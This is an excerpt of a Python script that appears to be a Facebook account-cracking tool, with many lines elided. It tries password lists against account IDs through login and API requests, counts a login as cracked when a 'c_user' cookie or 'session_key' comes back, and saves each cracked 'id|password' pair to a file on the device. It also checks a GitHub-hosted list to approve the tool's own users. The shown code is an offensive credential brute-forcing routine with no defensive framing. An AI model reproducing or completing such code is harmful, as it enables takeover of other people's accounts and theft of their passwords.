...
def menu_apikey():
  ...
  os.system(f'xdg-open https://www.facebook.com/SW4TI')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://github.com/MR-K1NGX/pro/blob/main/Promix.txt").text
    if id in httpCaht:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [AB-KHANX] %s | %s'%(ids,pas))
                                open(f'/sdcard/AB-KHANX.txt', 'a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [AB-KHANX] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/AB-KHANX.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[AB-KHANX] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
